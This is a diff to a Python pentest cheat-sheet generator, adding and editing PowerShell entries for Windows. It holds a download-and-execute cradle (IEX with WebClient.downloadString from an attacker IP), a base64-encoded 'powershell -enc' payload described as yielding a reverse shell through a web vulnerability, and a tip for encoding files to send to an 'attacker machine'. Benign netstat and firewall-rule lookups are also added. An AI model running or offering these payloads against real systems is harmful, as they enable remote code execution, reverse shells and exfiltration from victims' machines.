@@ -71,6 +71,10 @@ $encoded = [Convert]::ToBase64String($bytes)
 $encoded | Out-File new_IP_icmp.ps1.b64
 exit
 
+#OR simplesly
+IP_icmp.ps1 | iconv --to-code UTF-16LE | base64 -w0
+
+
 # - 4 on kali
 cat new_IP_icmp.ps1.b64 | sed 's/+/%2B/g' | sed 's/=/%3D/g'
 
@@ -2198,7 +2202,7 @@ youtube-dl --extract-audio --audio-format mp3 https://www.youtube.com/watch?v=IW
 ######################################
 ######################################
 
-powershell_enc = create_new_cheat("PowerShell exec code in base64")
+powershell_enc = create_new_cheat("PowerShell exec code in base64, encode and decode")
 powershell_enc.category = "Windows"
 powershell_enc.sub_category = "PowerShell"
 powershell_enc.output = f"""[*] PowerShell execute code in base64 for easy control bad chars on webexploit
@@ -2209,11 +2213,9 @@ echo 'IEX(New-Object Net.WebClient).downloadString("http://{ip}/IP.ps1")' | icon
 # Take the output and pass it to web vulnerability to get reverse shell (for example...)
 powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADEAMgAwAC8ASQBQAC4AcABzADEAIgApAAoA
 
-# TIPS: listener...
-# TIPS: reverse shell nishang (or other...) with name IP.ps1 like the comand...
-# TIPS: change last line of nishang reverse shell to auto execute the reverse shell...
-# TIPS: rlwrap, for pseudo historic and move with arrows
-
+[*] Powershell encode file or binary into base64 for transfere to attacker machine
+[convert]::ToBase64String((Get-Content -path "your_file_path" -Encoding byte))    # or
+[convert]::ToBase64String((cat "your_file_path" -Encoding byte))
 """
 
 
@@ -2521,5 +2523,41 @@ requests.post(TARGET_URL + '/vulnerable', json = {
 
 # execute
 requests.get(TARGET_URL)
+
+"""
+
+######################################
+######################################
+
+netstat_powershell = create_new_cheat("netstat - Powershell (adamtheautomator)")
+netstat_powershell.category = "Windows"
+netstat_powershell.sub_category = "Powershell"
+netstat_powershell.output = """[*] netstat - Powershell (adamtheautomator) - Very descritive output
+
+Get-NetTCPConnection | Select-Object -Property *,@{'Name' = 'ProcessName';'Expression'={(Get-Process -Id $_.OwningProcess).Name}}
+
+# Um pouco mais filtrado...
+Get-NetTCPConnection | Select-Object -Property State,Description,Name,LocalAddress,LocalPort,OwningProcess,RemoteAddress,RemotePort,PSComputerName,CimClass,CimInsta
+nceProperties,CimSystemProperties,@{'Name' = 'ProcessName';'Expression'={(Get-Process -Id $_.OwningProcess).Name}}
+
+# Dá para filtrar com um Pipe também...
+Get-NetTCPConnection | Select-Object -Property *,@{'Name' = 'ProcessName';'Expression'={(Get-Process -Id $_.OwningProcess).Name}} | FT -Property ProcessName,LocalAddress,LocalPort,RemoteAddress,RemotePort,State,Description
+
+Get-NetTCPConnection -State Listen | Select-Object -Property *,@{'Name' = 'ProcessName';'Expression'={(Get-Process -Id $_.OwningProcess).Name}} | FT -Property ProcessName,LocalAddress,LocalPort,RemoteAddress,RemotePort,State,Description
+"""
+
+
+######################################
+######################################
+
+check_firewall_rules_windows = create_new_cheat("Check Firewall Rule - Windows PowerShell")
+check_firewall_rules_windows.category = "Windows"
+check_firewall_rules_windows.sub_category = "Powershell"
+check_firewall_rules_windows.output = """[*] Check Firewall Rule - Windows PowerShell
+
+powershell -c "Get-NetFirewallRule -Direction OutBound -Action Block -Enable True"
+powershell -c "Get-NetFirewallRule -Direction OutBound -Action Allow -Enable True"
+
+powershell -c "Get-NetFirewallRule -Direction OutBound -Action Block -Enable True | Format-Table -Property Name, DisplayName, DisplayGroup, @{Name='Protocol';Expression={($PSItem | Get-NetFirewallPortFilter).Protocol}}, @{Name='LocalPort'; Expression={($PSItem | Get-NetFirewallPortFilter).LocalPort}}, @{Name='RemotePort';Expression={($PSItem | Get-NetFirewallPortFilter).RemotePort}}, @{Name='RemoteAddress';Expression={($PSItem | Get-NetFirewallAddressFilter).RemoteAddress}}, Enabled, Profile, Direction"
 
 """
